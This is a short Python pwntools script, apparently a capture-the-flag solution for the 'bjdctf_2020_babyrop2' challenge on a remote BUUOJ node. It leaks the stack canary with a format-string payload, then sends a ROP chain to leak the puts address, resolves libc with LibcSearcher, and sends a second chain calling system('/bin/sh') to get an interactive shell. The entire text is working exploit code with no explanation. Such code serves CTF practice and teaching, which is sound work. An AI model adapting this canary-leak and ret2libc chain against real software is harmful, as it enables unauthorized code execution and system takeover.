from pwn import *
from LibcSearcher import *

context.arch = 'amd64'
elf = ELF('bjdctf_2020_babyrop2')
pop_rdi = 0x400993

r = remote('node3.buuoj.cn', 29269)

r.recvuntil('u!\n')
r.sendline('%7$lx')
canary = int(r.recvline(False), 16)
r.recvline()
r.send('a' * 0x18 + flat([canary, 0xdeadbeef, pop_rdi, elf.got['puts'], elf.plt['puts'], elf.sym['vuln']]))
puts_addr = u64(r.recvline(False).ljust(8, '\x00'))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')
exit_addr = libc_base + libc.dump('exit')
r.recvline()
r.send('a' * 0x18 + flat([canary, 0xdeadbeef, pop_rdi, bin_sh_addr, system_addr, exit_addr]))
r.interactive()